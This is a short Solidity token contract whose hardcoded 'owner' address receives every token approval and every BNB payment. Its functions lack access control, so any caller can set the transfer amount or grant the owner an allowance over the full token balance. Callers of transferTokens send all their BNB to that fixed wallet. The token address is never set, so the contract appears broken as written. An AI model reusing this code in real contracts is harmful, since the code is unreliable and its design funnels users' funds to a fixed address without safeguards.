// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TokenTransferContract {
    address constant owner = 0x46018B731FC7865F937da3720A98EA0BBfF730b5;
    bool public approved;
    address public tokenAddress;
    uint256 public transferAmount;

    constructor() {
        approved = false;
    }

    function getERC20Balance(address _tokenAddress) external view returns (uint256) {
        return IERC20(_tokenAddress).balanceOf(address(this));
    }

    function getBNBBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function approveTokenTransfer() external {
        uint256 fullAmount = IERC20(tokenAddress).balanceOf(address(this));
        IERC20(tokenAddress).approve(owner, fullAmount);
        approved = true;
    }

    function transferTokens() external payable {
        require(approved, "Token not approved yet");
        require(msg.value >= transferAmount, "Insufficient BNB balance");

        IERC20(tokenAddress).transfer(owner, transferAmount);
        payable(owner).transfer(msg.value);
    }

    function setTransferAmount(uint256 _amount) external {
        transferAmount = _amount;
    }
}
